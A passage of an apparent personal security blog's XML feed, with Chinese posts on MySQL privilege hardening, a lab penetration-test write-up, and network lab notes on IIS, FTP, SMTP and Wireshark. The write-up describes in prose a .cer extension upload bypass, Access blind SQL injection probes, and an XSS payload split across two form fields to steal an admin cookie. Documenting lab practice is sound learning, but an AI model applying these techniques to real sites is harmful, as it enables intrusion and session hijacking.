title="结语"></a>结语</h2><p>本来还想写写Windows下的防火墙，但由于是图形化界面，学起来也容易上手，就没写了，我比较懒~~~运用好防火墙，可以隐藏你自己的IP地址，减少被攻击的可能性，在生活中大有用处。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Linux下&lt;code&gt;iptables&lt;/code&gt;的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，
    
    </summary>
    
      <category term="环境部署" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="Linux安全" scheme="0verwatch.top/tags/Linux%E5%AE%89%E5%85%A8/"/>
    
      <category term="服务器运维" scheme="0verwatch.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Mysql安全配置</title>
    <link href="0verwatch.top/2018/07/26/Mysql-security-1/"/>
    <id>0verwatch.top/2018/07/26/Mysql-security-1/</id>
    <published>2018-07-26T12:35:31.000Z</published>
    <updated>2018-07-26T12:37:15.855Z</updated>
    
    <content type="html"><![CDATA[<p>mysql中存在4个控制权限的表，分别为<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. mysql.USER表</span><br><span class="line">2. mysql.DB表</span><br><span class="line">3. mysql.TABLES_PRIV表</span><br><span class="line">4. mysql.COLUMNS_PRIV表</span><br></pre></td></tr></table></figure><p>要注意的是，Mysql中有一个数据库”<code>information_schema</code>“，似乎里面保存的也是一些权限信息，但是要明白的是，这个数据库”<code>information_schema</code>“是为系统管理员提供元数据的一个简便方式，它实际上是一个视图，可以理解为对Mysql中的一个信息的封装，对于Mysql主程序来说，身份认证和授权的信息的来源只有一个，就是”<code>mysql</code>“。</p><p>在我们进行数据库连接、登录的时候，mysql权限表的验证过程为：</p><ol><li>先从user表中的:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) Host</span><br><span class="line">2) User</span><br><span class="line">3) Password</span><br></pre></td></tr></table></figure><p>这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。</p><ol start="2"><li>通过身份认证后，进行权限分配，按照下面的顺序进行验证。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1) user</span><br><span class="line">2) db</span><br><span class="line">3) tables_priv</span><br><span class="line">4) columns_priv</span><br></pre></td></tr></table></figure><p>即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，将<code>不再</code>检查<code>db，tables_priv,columns_priv</code><br>如果全局权限表<code>user</code>对应的权限为<code>N</code>，则到db表中检查此用户对应的具体数据库，并得到db中为Y的权限<br>如果db中为N，则检查<code>tables_priv</code>中此数据库对应的具体表，取得表中的权限Y，以此类推。逐级下降</p><p>用自己的话讲就是因为查找他们权限是否配置好根据情况查看<code>mysql</code>这个数据库中的<code>user，db，tables_priv，columns_pri</code>，一旦在某个级别设置好了权限就不需要网下一级去看他是否存在权限了，因为下面一级的表都不会显示，这是为了防止数据库数据冗余。就是例如你设置的是所有数据库及表的权限的话，到时候就直接<code>select * from user;</code>就可以查看对应的程序啦<br><a href="https://imgchr.com/i/PNNSfK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/26/PNNSfK.md.png" alt="PNNSfK.md.png"></a></p><p>对于Mysql中的账户权限相关的安全配置，总结如下：</p><ol><li>针对每个网站建立一个单独的账户</li><li>为每个网站单独建立一个专属数据库(虽然DEDE、DZ普通采用表前缀的方法来实现”一库多站”，但好的做法还是”一库一站”)</li><li>按照<code>user-&gt;db-&gt;tables_priv-&gt;columns_pri</code>的顺序进行细粒度的权限控制</li><li>为每个用户单独配置一个专属数据库，保证当前用户的所有操作只能发生在它自己的数据库中，防止SQL注入发生后，黑客通过注入点访问到系统表</li></ol><p>账户权限安全配置需要的常用命令<br>1)新建一个用户并给予相应数据库的权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant select,insert,update,delete,create,drop privileges on 数据库名字.表名 to user@localhost identified by 'passwd';    //如果是*号就是代表全部*.*代表所有数据库下的全部表名</span><br><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> database.* <span class="keyword">to</span> <span class="keyword">user</span>@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'passwd'</span>;</span><br></pre></td></tr></table></figure><p>2) 刷新权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure><p>3)显示授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">grants</span>;  //这句话只显示当前登录用户的权限</span><br></pre></td></tr></table></figure><p>4) 移除授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">delete</span> <span class="keyword">on</span> *.* <span class="keyword">from</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure><p>5) 删除用户<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure></p><p>6) 给用户改名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rename</span> <span class="keyword">user</span> <span class="string">'jack'</span>@<span class="string">'%'</span> <span class="keyword">to</span> <span class="string">'jim'</span>@<span class="string">'%'</span>;``</span><br></pre></td></tr></table></figure></p><p>7) 给用户改密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> = <span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mysql中存在4个控制权限的表，分别为
    
    </summary>
    
      <category term="Mysql安全配置" scheme="0verwatch.top/categories/Mysql%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="Mysql安全配置" scheme="0verwatch.top/tags/Mysql%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>记录一次模拟渗透</title>
    <link href="0verwatch.top/2018/07/25/pentest-1/"/>
    <id>0verwatch.top/2018/07/25/pentest-1/</id>
    <published>2018-07-25T13:51:46.000Z</published>
    <updated>2018-07-25T13:55:55.261Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天还模拟了一次真实的挖洞过程，今天这网站一共有三个漏洞（都是要经过提醒才能弄出来），因为是搭的环境，简单记录一下思路，顺便当个回顾，源码啥的都没有了<a id="more"></a>，耍完就要求删掉了。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这台服务器有个前提就是跟我们一个网段的服务器，并且开了IIS服务，但是前提我们是不知道他的ip的，这个时候我们需要用一下nmap来扫一下同一网段下的ip  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -PI -PT 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>记得当时出现了三个ip地址，再使用nmap去扫描各个ip的端口，命令是<code>namp 你锁定的ip地址</code></p><p>发现中间的第二个ip是有开IIS服务的，但是也开了其他端口的服务，这时候我们需要注意的是目标不要仅仅盯着IIS这个服务端口，我们也需要把其他不是常用端口都是尝试一遍，其中一些常见的端口要知道，常开的我们就可以选择性忽略，比如<code>3306可以远程连接数据库，3389远程连接，445端口永恒之蓝的端口</code>等等，遇到这些端口先记着，因为我们前提是不准使用msf打，毕竟我们练的是网站渗透的思路。所以还是回来网站的渗透思路上吧。</p><p>当时尝试到其中的<code>8888端口</code>的时候，就出现了一个网站，随便点两下，发现是一个asp的网站，这点很重要，不然到后期的时候上传木马的时候传了个php的小马就很搞笑了。</p><p>首先先扫描一波目录，这里我用的是一款很经典的扫描工具御剑，其实github上还有很多类似的扫描工具，就不多说了，扫到了一个类似源码的压缩包，这在正常情况下是很大的漏洞了，打开源码第一件事情先要去找配置文件，数据库配置文件之类的，由于这里用的是Access数据库，而<code>Access数据库</code>使用的是<code>文件存储</code>，在里面我们可以很轻易地找到后台登录管理员账号密码，只不过密码需要解密一下，此时也扫到了后台了登录页面，先登录一波，这时候我的思路先点一下查看一下是否有上传的地方，发现有图片上传的地方，因为源码已经得到了，我就去看源码关于上传这一部分的代码，这里面我审计出来可以用<code>cer</code>去改后缀名上传去执行，这里我们还需要注意下常见的除了<code>asp，aspx</code>可以执行以外，还有<code>cgi，cer</code>之类的后缀名可以尝试上传一下，最后上传之后就获得了网站的全权限了。</p><p>第二个漏洞是在某一个二级域名下存在的SQL注入漏洞，用的<code>and 1=1</code>还有<code>and1=2</code>测出来的，服务器返回了500作为盲注的回显点，参考了这篇文章:<code>https://blog.csdn.net/u011781521/article/details/53942183</code>, Access数据库的注入比较麻烦，我尝试出来是一个盲注，但是Access盲注在后期的表名全靠猜，字典里面没有就GG了。后面也是获得后台登录的密码。回到前面的步骤去getshell了。</p><p>第三个漏洞是一个XSS漏洞，这里也是别人提醒我才会用这种骚操作去得到管理员的cookie然后登陆后台，当时教我用xss平台去实现这一过程，在一个填写简历的的表单里面去实现，测试发现最大的两个文本框已经是编码实例化了，过滤了一大堆东西，就不可以利用了，问题是在上面填写学历还有姓名之类的地方存在xss，这里不得不赞一波这个xss平台，能将一大段js代码，变成一个短链接，缩小了代码量，别人就会更大的机会去点击，这里还学到的就是xss在点击查看源码的时候应该是要查看框架的源码，有时候可能直接右键看源码看到的是其他div的代码了，就看不清楚xss是否起了作用，而且这里的文本框限制了大小我们可以用Bp去实现发包实现，但是我查看源码发现缺了一段，原因就是Access里面限制了大小，那这个时候我们可以这样去绕过，注释符是一个好东西，分别在两个文本框里面填入<code>/*</code>和<code>*/</code>,就例如在姓名里面填入<code>&lt;script&gt;alert(1)/*</code>在学历的框里面填入<code>*/&lt;/script&gt;</code>这样测试就很OK，右键查看源码就可以发现在/**/里面就很多其他代码，但是就相当于注释掉了，刚好把两个框里面的代码拼在一起了，只是例举了一个反射型xss。这样就可以返回你的xss平台看你打的结果。然后就可以把cookie获得最好的方法就是直接在浏览器里面改变你需要的cookie，不然的话尝试一下用bp发包每一次都是需要改一次cookie的，因为页面的每一部分功能打开都是需要重新使用cookie，而本地保存的又不是你xss打回来的cookie，因此需要修改多次cookie，而最好的解决方法就是直接修改浏览器本地保存的cookie就好。登录后台又回到上传漏洞去了，233333。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>全文字，没有图片，终于把今天的思路回想了一遍。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天还模拟了一次真实的挖洞过程，今天这网站一共有三个漏洞（都是要经过提醒才能弄出来），因为是搭的环境，简单记录一下思路，顺便当个回顾，源码啥的都没有了
    
    </summary>
    
      <category term="网站渗透" scheme="0verwatch.top/categories/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网站渗透" scheme="0verwatch.top/tags/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>计网实验笔记(二)</title>
    <link href="0verwatch.top/2018/07/20/comp-net-2/"/>
    <id>0verwatch.top/2018/07/20/comp-net-2/</id>
    <published>2018-07-20T06:07:31.000Z</published>
    <updated>2018-07-20T06:15:24.836Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇博客是接着上一篇的实验总结，这部分的实验是网络服务器配置设计，这部分感觉就有点水。<br><a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><strong>实验内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(1) 在PC机上下载安装IIS，学习IIS的组成和功能，以及IIS的使用方法。</span><br><span class="line">(2) 分别在本机进行WebServer、EmailServer、FTPServer的配置设计；</span><br><span class="line">(3) 通过另外一台接入互联网的PC机（或自己的手机）的通用客户程序（浏览器或DOS终端）访问自己设置的WebServer、EmailServer、FTPServer。</span><br></pre></td></tr></table></figure><h3 id="实验内容一"><a href="#实验内容一" class="headerlink" title="实验内容一"></a>实验内容一</h3><p>首先从控制面板里面找到程序然后去选择打开或关闭windows功能，选择Web管理工具还有万维网服务<br><img src="https://s1.ax1x.com/2018/07/20/P3oe8H.png" alt="P3oe8H.png"><br>然后回去控制面板里面选择管理工具，打开第一个IIS管理器<br><a href="https://imgchr.com/i/P3onxA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3onxA.md.png" alt="P3onxA.md.png"></a><br>点击左边的网站然后去新建一个网站，我的配置信息如下，IP地址为192.168.19.1，网站的源码目录在放在该电脑下的C盘目录下的www目录下，这里可以自己设置域名<br><img src="https://s1.ax1x.com/2018/07/20/P3oKKI.png" alt="P3oKKI.png"></p><p>点击新建立的网站还可以去设定默认的页面是什么<br><a href="https://imgchr.com/i/P3oMrt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3oMrt.md.png" alt="P3oMrt.md.png"></a><br>在www目录下编写一个HTML页面，代码内容如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">        My frrst Page!</span><br><span class="line">    <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">p1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p1</span>&gt;</span>这是我第一个Web服务器<span class="tag">&lt;/<span class="name">p1</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在本机浏览器目录下输入对应的IP地址也就是刚刚设定IP，浏览器上有回显内容<br><img src="https://s1.ax1x.com/2018/07/20/P3oyiF.png" alt="P3oyiF.png"></p><h3 id="实验内容二"><a href="#实验内容二" class="headerlink" title="实验内容二"></a>实验内容二</h3><p><strong>WebServe的配置设计</strong><br>上网随便下载一个ASP源码，然后放在所设定的网页目录下，设置默认网站访问index.html,配置的相关信息，步骤跟上面配置IIS服务器差不多<br><img src="https://s1.ax1x.com/2018/07/20/P3o7Je.png" alt="P3o7Je.png"><br>本机访问219.219.68.183:8080,浏览器有回显<br><a href="https://imgchr.com/i/P3oHRH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3oHRH.md.png" alt="P3oHRH.md.png"></a></p><p><strong>FTPServer的配置设计</strong><br>FTP服务的开启跟IIS的开启有点类似，从控制面板里面找到程序然后去选择打开或关闭windows功能，选择FTP服务器的选项<br><img src="https://s1.ax1x.com/2018/07/20/P3oXLt.png" alt="P3oXLt.png"></p><p>然后就开始配置FTP服务器，选中一个目录用来存放你提供访问以及下载的文件<br>电脑的C盘下设置C:\FTP，该目录下有很多子目录供访问，上传和下载。<br>然后在IIS管理器里面新建一个FTP站点，然后设置相关的信息<br><img src="https://s1.ax1x.com/2018/07/20/P3oveP.png" alt="P3oveP.png"><br><img src="https://s1.ax1x.com/2018/07/20/P3oxdf.png" alt="P3oxdf.png"></p><p>然后设置身份信息还有权限，设置匿名用户的话就允许其他人访问了，如果有特殊要求再设置其他用户类型，点击完成就可以开启该服务了<br><img src="https://s1.ax1x.com/2018/07/20/P3TFQs.png" alt="P3TFQs.png"></p><p>在本机浏览器上输入自己设定的ip,输入<code>ftp://219.219.61.183,</code>浏览器上显示目标文件夹内的所有文件，并支持下载，如图<br><a href="https://imgchr.com/i/P3Tkyn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Tkyn.md.png" alt="P3Tkyn.md.png"></a></p><p><strong>SMTP服务器的配置</strong><br>这里原本的配置原本是想直接在windows上面实现的，都是后来发现了一种更好的方可以用思科这款工具完成，其实上面的实验也可以直接模仿，网络拓扑图就是下面的结构，<br><a href="https://imgchr.com/i/P3TZwV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3TZwV.md.png" alt="P3TZwV.md.png"></a><br>但是就单单配置邮箱服务器的话，我就把拓扑图简化，形成下面的拓扑图，需要注意的是在没有DHCP服务器的的情况下，需要自己静态去配置IP地址，域名服务器保留<br><img src="https://s1.ax1x.com/2018/07/20/P3TeoT.png" alt="P3TeoT.png"></p><p>PC1还有PC2两台机子的IP设置如下，还有MAIL和DNS服务器的IP地址设置<br><img src="https://s1.ax1x.com/2018/07/20/P37Gcj.png" alt="P37Gcj.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37Jjs.png" alt="P37Jjs.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37tun.png" alt="P37tun.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37NBq.png" alt="P37NBq.png"><br>然后再配置DNS服务器里面的相关域名，其他无用的服务我们可以关掉<br><a href="https://imgchr.com/i/P37wNT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37wNT.md.png" alt="P37wNT.md.png"></a><br>然后配置邮箱服务器，注意这里要配置的两个用户名与密码跟后面PC1和PC2配置的要一致。我这里设置的是test1和test2<br><a href="https://imgchr.com/i/P37DCF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37DCF.md.png" alt="P37DCF.md.png"></a><br>然后在PC1和PC2里面配置相对应邮件信息，这时候上面配置的用户名就有用了<br><img src="https://s1.ax1x.com/2018/07/20/P37sgJ.png" alt="P37sgJ.png"><br><img src="https://s1.ax1x.com/2018/07/20/P37yv9.png" alt="P37yv9.png"><br>点击PC1邮件功能里面的compose编辑发送邮件的信息，然后Send<br><a href="https://imgchr.com/i/P37cuR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37cuR.md.png" alt="P37cuR.md.png"></a></p><p>从receive里查看接受的信息，收到刚才发送的信息了<br><img src="https://s1.ax1x.com/2018/07/20/P37gD1.png" alt="P37gD1.png"><br>同理，PC2也能同样的接受发送信息</p><h3 id="实验内容三"><a href="#实验内容三" class="headerlink" title="实验内容三"></a>实验内容三</h3><p>手机访问Webserver，也就是219.219.68.183:8080,手机上回显网页信息，搭建成功<br><img src="https://s1.ax1x.com/2018/07/20/P372Hx.jpg" alt="P372Hx.jpg"></p><p>同样手机访问FTPserver，填写好信息,手机上回显网页信息，连接成功<br><a href="https://imgchr.com/i/P37WE6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37WE6.md.png" alt="P37WE6.md.png"></a><br>对于邮箱服务器用PC1跟PC2互相发送邮件:<br><a href="https://imgchr.com/i/P375CD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P375CD.md.png" alt="P375CD.md.png"></a><br><a href="https://imgchr.com/i/P37I8e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P37I8e.md.png" alt="P37I8e.md.png"></a><br>两台机子都能够互相接收邮件，成功验证</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>突然发现仿真软件真的是强大，本来还是想在win7的机子上直接模拟的邮箱服务器，发现死活都不行，没想到仿真软件还能这样玩，自己还是太菜，啥都不知道。。。。关于邮件，smtp协议只是一个发送的协议，接收邮件的时候用的可是pop以及imap协议，这还是要注意一下的，不过现在的发邮件都是被http封装的，也就是直接从web里面直接完成操作，即使改变了UA到服务器那一段，但是两个邮箱服务器之间传输的协议还是没有变的，依旧是smtp。。。</p><p>放暑假了啊！！！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇博客是接着上一篇的实验总结，这部分的实验是网络服务器配置设计，这部分感觉就有点水。&lt;br&gt;
    
    </summary>
    
      <category term="计算机网路" scheme="0verwatch.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF/"/>
    
    
      <category term="计算机网路" scheme="0verwatch.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF/"/>
    
  </entry>
  
  <entry>
    <title>计网实验笔记(一)</title>
    <link href="0verwatch.top/2018/07/20/comp-net-1/"/>
    <id>0verwatch.top/2018/07/20/comp-net-1/</id>
    <published>2018-07-20T06:05:22.000Z</published>
    <updated>2018-07-20T06:18:51.115Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总算有时间把计网实验的学习过程记录一下了。也当做是一个复习的过程，过程太长，分两篇博客写吧。<br><a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这一篇是对协议报文的分析，这里面有对Wireshark的使用，只能说我对于Wireshark这款软件的使用还是渣。各种ip地址的过滤以及如何去利用Wireshark强大的搜索功能这里就不多说了。个人感觉最好的方法就是在CTF里面的流量分析题目里学，在CTF的流量分析题目里面你会经常触碰到那种要导出文件图片，导进秘钥解密https的各种类型题，感觉学的会更快。</p><p>不多说废话下面上课实验的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1） 运用抓包工具，分别获取不同互联网访问情形下的本机网卡数据包；过滤捕获和过滤显示不同条件的数据包。</span><br><span class="line">（2）分别对不同互联网访问情形下的数据包进行逐层分析，给出各层协议的主要参数及意义；要求分别获取WWW服务、Email服务、QQ通信和迅雷文件下载四种不同网络服务过程中的数据包。</span><br><span class="line">（3）运用抓包工具，连续获取面向连接的互联网访问情形下的本机网卡数据包；对连续获取的数据包找到执行面向连接过程的报文，给出实现面向连接过程（TCP三次握手）的详细分析。</span><br></pre></td></tr></table></figure></p><h3 id="实验内容第一点"><a href="#实验内容第一点" class="headerlink" title="实验内容第一点"></a>实验内容第一点</h3><p><strong>http协议</strong><br>关于这个协议，个人理解是万维网的服务协议，默认端口是80端口，运输层使用的是可靠的TCP，不过现在也有它的加密版本https，也就是在http的基础上增加了ssl去加密，默认端口是443，所以在我们需要解密含有https的报文的时候，想查看更多的信息，应该追踪http流而不应该追踪tcp，到运输层的时候已经加密了，看不出啥东西的，我记得DDCTF里面有一道流量分析的题目就是这样的，里面可以导出一个图片然后运用的是ocr把秘钥提取出来。确实有点烦，ocr这东西不准。对于Wireshark里面的分组，我们可以直接过滤http就可以获得啦，前提是记得访问http的页面，别访问https的页面，233333，不然你只能顾虑的是https了。</p><p><a href="https://imgchr.com/i/P3dftU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P3dftU.md.png" alt="P3dftU.md.png"></a></p><p><strong>UDP协议</strong><br>UDP协议是面向报文的一种协议，如果你观察他的封装，你会发现客户给他什么数据他就直接封装网下层IP层送去，不像TCP一样会有时候会对报文的进行分组处理，所以一般UDP都是不可靠，无连接的，除非上层的应用程序承担了检错的任务，所以UDP协议追求的是效率，一般都用在视频语音上了。我们在抓包的时候直接使用udp就可以过滤网络中的udp用户数据报文了。</p><p><a href="https://imgchr.com/i/P30lMd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P30lMd.md.png" alt="P30lMd.md.png"></a></p><p><strong>TCP协议</strong><br>TCP协议是是一种面向字节流，可靠，面向连接的协议，他对于用户传送的报文可以进行分组形成报文段，其中协议中如何保证传输的正确性，如何进行拥塞控制，如何进行连接的建立以及释放都是重点，为了复习，还是回顾一下吧，其中保证传输的正确性窗口(窗口的概念就不多讲了)的作用至关重要，其中最为重要的是其中的ARQ协议(自动重传协议)，对于拥塞控制，最重要的还是那四个算法，慢开始，拥塞避免，快重传，快恢复，关键点就在拥塞窗口值以及门限值的变化并且在不同情况下使用的算法也不一样，慢开始是使用在一开始的时候以及发现超时的时候使用的，而快重传，快恢复是在在超时计数器结束前连续收到三个响应报文使用的。在过滤的时候我们只需要用tcp命令就可把TCP报文给滤出来了。</p><p><a href="https://imgchr.com/i/P30YIf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P30YIf.md.png" alt="P30YIf.md.png"></a></p><p><strong>ICMP协议</strong><br>ICMP协议是一种用于报告错误信息的协议，位于IP层，我们平常使用的ping，tracert命令都是属于这一协议里面的，这两个命令都十分常用，ping用于及钠盐网络是否连通，而是用tracert命令我们可以探测出网络拓扑结构，所以要抓到icmp的报文，只需要ping一下然后在Wireshark里面用icmp这一个命令过滤出来即可。<br><a href="https://imgchr.com/i/P32ksU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P32ksU.md.png" alt="P32ksU.md.png"></a></p><h3 id="实验内容第二点"><a href="#实验内容第二点" class="headerlink" title="实验内容第二点"></a>实验内容第二点</h3><p>先把各部分的包的先过滤出来</p><p><strong>WWW服务数据包:</strong><br><a href="https://imgchr.com/i/P3RwN9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3RwN9.md.png" alt="P3RwN9.md.png"></a><br><strong>Email服务数据包:</strong><br><a href="https://imgchr.com/i/P3Rlhn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Rlhn.md.png" alt="P3Rlhn.md.png"></a><br><strong>QQ通信数据包:</strong><br><a href="https://imgchr.com/i/P3R0hR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3R0hR.md.png" alt="P3R0hR.md.png"></a></p><p><strong>迅雷文件下载服务数据包:</strong><br><a href="https://imgchr.com/i/P3RqHg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3RqHg.md.png" alt="P3RqHg.md.png"></a></p><p>不同互联网访问情形下的数据包进行逐层分析，先Packet Details Pane(封包详细信息)有大致理解, 显示封包中的字段，各行信息说明如下：</p><ol><li>Frame:  物理层的数据帧概况(这是最底层的，一般以比特流传送，看不懂)</li><li>Ethernet II:  数据链路层以太网帧头部信息，</li><li>Internet Protocol Version 4:  互联网层IP包头部信息</li><li>Transmission Control Protocol:  传输层T的数据段头部信</li><li>Hypertext Transfer Protocol:  应用层的信息</li></ol><p><strong>UDP数据包详细分析：</strong><br><a href="https://imgchr.com/i/P3W85d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3W85d.md.png" alt="P3W85d.md.png"></a><br>这个数据包的详细信息里面包含了物理层(Frame那一行)，数据链路层(Ethernet那一行)，网路层(Internet Protocol那一行)，传输层(User Datagram Protocol那一行)还有应用层数据，层次结构十分明显。<br>从UDP的报文格式可以得到UDP的首部信息，源端口为4026，目的端口为8000，UDP长度为55，检验和为0x4362<br><a href="https://imgchr.com/i/P3hE11" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hE11.md.png" alt="P3hE11.md.png"></a><br>再看IP层的内容<br><a href="https://imgchr.com/i/P3hZX6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hZX6.md.png" 